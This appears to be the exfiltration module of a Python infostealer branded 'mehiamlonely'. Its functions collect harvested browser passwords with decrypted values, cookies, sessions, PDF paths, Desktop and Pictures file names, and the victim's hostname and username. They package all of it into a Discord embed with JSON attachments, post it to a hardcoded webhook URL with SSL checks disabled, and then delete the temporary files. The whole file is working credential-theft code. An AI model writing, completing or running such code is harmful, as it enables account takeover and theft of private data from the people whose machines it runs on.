import aiohttp
import asyncio
import json
import os
import platform
import ssl
from pathlib import Path

WEBHOOK_URL = "https://discord.com/api/webhooks/1425100838027661322/AOiqff4YaLAJm27HcKC48ilNw3v0g9DM2xkE3PNUwUJE1vSF0lgRG7J0nYn6CewRisgu"

async def send_to_discord_webhook(extracted_data, pdf_paths=None):
    """
    Send extracted data to Discord webhook
    """
    if pdf_paths is None:
        pdf_paths = []
        
    system_info = {
        'hostname': platform.node(),
        'username': os.getenv('USER', 'unknown'),
        'platform': platform.platform()
    }
    
    # Count the data
    password_count = len(extracted_data.get('passwords', []))
    cookie_count = len(extracted_data.get('cookies', []))
    session_count = len(extracted_data.get('sessions', {}))
    pdf_count = len(pdf_paths)
    desktop_pictures_count = len(extracted_data.get('desktop_pictures_files', []))
    
    # Create embed data
    embed_data = {
        "title": "🔍 mehiamlonely - Data Extracted",
        "description": f"Data extraction report from {system_info['hostname']} ({system_info['username']})",
        "color": 0xFF0000,
        "fields": [
            {
                "name": "Passwords Found",
                "value": str(password_count),
                "inline": True
            },
            {
                "name": "Cookies Found", 
                "value": str(cookie_count),
                "inline": True
            },
            {
                "name": "Sessions Found",
                "value": str(session_count),
                "inline": True
            },
            {
                "name": "PDF Files Found",
                "value": str(pdf_count),
                "inline": True
            },
            {
                "name": "Desktop/Pictures Files Found",
                "value": str(desktop_pictures_count),
                "inline": True
            },
            {
                "name": "Platform",
                "value": system_info['platform'],
                "inline": True
            }
        ],
        "footer": {
            "text": f"mehiamlonely - Extracted on {platform.node()}"
        }
    }
    
    # Add password details if any (showing actual passwords this time)
    passwords_file = None
    if password_count > 0:
        passwords_info = []
        for pwd in extracted_data.get('passwords', []):
            password_value = pwd.get('pass', '[Decryption failed]')
            if password_value == '[No decryption key]':
                password_value = "[Encrypted - No key]"
            passwords_info.append(f"🌐 {pwd.get('url', 'N/A')} | 👤 {pwd.get('user', 'N/A')} | 🔑 {password_value}")
        
        if len(passwords_info) <= 5:
            # If few passwords, show directly in embed
            embed_data["fields"].append({
                "name": "Passwords (Full Details)",
                "value": "\n".join(passwords_info),
                "inline": False
            })
        else:
            # If too many passwords, save to file and mention in embed
            passwords_file = f"passwords_{platform.node()}_{os.getpid()}_{hash(str(passwords_info)) % 10000}.json"
            with open(passwords_file, 'w', encoding='utf-8') as f:
                json.dump(extracted_data.get('passwords', []), f, indent=2, ensure_ascii=False)
            embed_data["fields"].append({
                "name": "Passwords",
                "value": f"Found {len(passwords_info)} passwords - see attached file",
                "inline": False
            })
    
    # Add cookie details if any (with actual values)
    cookies_file = None
    if cookie_count > 0:
        cookies_info = []
        for cookie in extracted_data.get('cookies', []):
            cookie_value = cookie.get('value', '[Decryption failed]')
            if cookie_value == '[No decryption key]':
                cookie_value = "[Encrypted - No key]"
            cookies_info.append(f"🌐 {cookie.get('host', 'N/A')} | 📌 {cookie.get('name', 'N/A')} | 💲 {cookie_value}")
        
        if len(cookies_info) <= 5:
            # If few cookies, show directly in embed
            embed_data["fields"].append({
                "name": "Cookies (Full Details)",
                "value": "\n".join(cookies_info),
                "inline": False
            })
        else:
            # If too many cookies, save to file and mention in embed
            cookies_file = f"cookies_{platform.node()}_{os.getpid()}_{hash(str(cookies_info)) % 10000}.json"
            with open(cookies_file, 'w', encoding='utf-8') as f:
                json.dump(extracted_data.get('cookies', []), f, indent=2, ensure_ascii=False)
            embed_data["fields"].append({
                "name": "Cookies",
                "value": f"Found {len(cookies_info)} cookies - see attached file",
                "inline": False
            })
    
    # Add PDF info if any
    if pdf_count > 0:
        pdf_info = []
        for pdf_path in pdf_paths[:5]:  # Show first 5 PDFs
            pdf_info.append(f"📄 {Path(pdf_path).name}")
        
        if len(pdf_paths) > 5:
            pdf_info.append(f"... and {len(pdf_paths) - 5} more")
        
        embed_data["fields"].append({
            "name": "PDF Files (Sample)",
            "value": "\n".join(pdf_info),
            "inline": False
        })
    
    # Add desktop/pictures files if any
    if desktop_pictures_count > 0:
        files_info = []
        for file_path in extracted_data.get('desktop_pictures_files', [])[:5]:  # Show first 5 files
            files_info.append(f"📁 {Path(file_path).name}")
        
        if len(extracted_data.get('desktop_pictures_files', [])) > 5:
            files_info.append(f"... and {len(extracted_data.get('desktop_pictures_files', [])) - 5} more")
        
        embed_data["fields"].append({
            "name": "Desktop/Pictures Files (Sample)",
            "value": "\n".join(files_info),
            "inline": False
        })
    
    # Create SSL context that works better on macOS
    connector = aiohttp.TCPConnector(ssl=False)  # Skip SSL verification for now (for development)
    async with aiohttp.ClientSession(connector=connector) as session:
        try:
            # Prepare multipart data for files
            data = aiohttp.FormData()
            
            # For multipart with embeds, we need to add embeds as a separate field
            data.add_field('payload_json', json.dumps({"embeds": [embed_data]}))
            
            # Add files if they exist
            file_handles = []
            if passwords_file and os.path.exists(passwords_file):
                file_handle = open(passwords_file, 'rb')
                file_handles.append(file_handle)
                data.add_field('file', file_handle, filename=os.path.basename(passwords_file))
            if cookies_file and os.path.exists(cookies_file):
                file_handle = open(cookies_file, 'rb')
                file_handles.append(file_handle)
                data.add_field('file', file_handle, filename=os.path.basename(cookies_file))
            
            async with session.post(WEBHOOK_URL, data=data) as response:
                if response.status == 204 or response.status == 200:
                    print("✅ Data sent successfully to Discord webhook!")
                    # Clean up temporary files
                    for handle in file_handles:
                        handle.close()
                    if passwords_file and os.path.exists(passwords_file):
                        os.remove(passwords_file)
                    if cookies_file and os.path.exists(cookies_file):
                        os.remove(cookies_file)
                    return True
                else:
                    print(f"❌ Failed to send to Discord webhook: {response.status} - {await response.text()}")
                    # Clean up temporary files
                    for handle in file_handles:
                        handle.close()
                    if passwords_file and os.path.exists(passwords_file):
                        os.remove(passwords_file)
                    if cookies_file and os.path.exists(cookies_file):
                        os.remove(cookies_file)
                    return False
        except aiohttp.ClientConnectorError as e:
            print(f"❌ Connection error sending to Discord webhook: {str(e)}")
            return False
        except aiohttp.ServerTimeoutError as e:
            print(f"❌ Timeout error sending to Discord webhook: {str(e)}")
            return False
        except ssl.SSLError as e:
            print(f"❌ SSL error sending to Discord webhook: {str(e)}")
            print("💡 This may be a macOS SSL certificate issue - you might need to run this command to fix it:")
            print("   /Applications/Python\\ 3.13/Install\\ Certificates.command")
            return False
        except Exception as e:
            print(f"❌ Error sending to Discord webhook: {str(e)}")
            return False

async def save_data_to_file_and_send(extracted_data, pdf_paths=None):
    """
    Save extracted data to a local file and send to Discord webhook
    """
    if pdf_paths is None:
        pdf_paths = []
    
    # Save data to a local JSON file
    filename = f"extracted_data_{platform.node()}_{os.getpid()}_{hash(str(extracted_data)) % 10000}.json"
    filepath = Path(filename)
    
    data_to_save = {
        "system_info": {
            'hostname': platform.node(),
            'username': os.getenv('USER', 'unknown'),
            'platform': platform.platform()
        },
        "extracted_data": extracted_data,
        "pdf_paths": pdf_paths
    }
    
    with open(filepath, 'w', encoding='utf-8') as f:
        json.dump(data_to_save, f, indent=2, ensure_ascii=False)
    
    print(f"💾 Data saved to {filepath}")
    
    # Send to Discord webhook
    success = await send_to_discord_webhook(extracted_data, pdf_paths)
    
    return success